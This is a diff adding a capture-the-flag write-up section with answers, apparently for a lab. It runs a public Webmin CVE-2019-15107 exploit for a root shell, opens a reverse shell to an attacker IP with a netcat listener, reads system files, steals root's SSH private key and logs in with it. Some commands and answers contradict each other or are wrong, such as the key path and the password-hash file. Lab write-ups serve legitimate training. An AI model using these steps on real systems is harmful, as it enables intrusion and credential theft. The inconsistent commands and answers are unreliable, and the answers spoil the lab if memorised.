@@ -94,4 +94,54 @@ $ curl https://www.exploit-db.com/exploits/47330 | grep -i CVE
 
 ## Task 6
 
-1. 
+```bash
+# After do instructions run exploit
+$ $ ./CVE-2019-15107.py <target_ip>
+[...]
+$ whoami
+root
+
+# Shell stabilization (on exploit pseudoshell)
+$ shell 
+[*] Starting the reverse shell process
+[*] For UNIX targets only!
+[*] Use 'exit' to return to the pseudoshell at any time
+Please enter the IP address for the shell: <attacker_ip>
+Please enter the port number for the shell: <port_listener>
+
+[*] Start a netcat listener in a new window (nc -lvnp 12345) then press enter.
+
+# On the nc listener
+sh-4.4# 
+
+# Check root's hash
+sh-4.4# cat/etc/passwd
+
+# Copy content of /root/.ssh/id_rsa
+sh-4.4# cat /etc/.ssh/id_rsa #Copy the content
+[...]
+# On the attacker machine
+$ echo "<id_rsa_content>" > id_rsa_wreath
+$ chmod 600 id_rsa_wreath
+
+# Connect us to the target machine
+$ ssh -i id_rsa_wreath root@<target_ip>
+$ whoami
+root
+```
+
+1. Run the exploit and obtain a pseudoshell on the target!
+
+**Just execut the python exploit**
+
+2. Which user was the server running as?
+
+**root**
+
+3. What is the root user's password hash?
+
+**Check content of /etc/passwd**
+
+4. What is the full path to this file?
+
+**/root/.ssh/id_rsa**
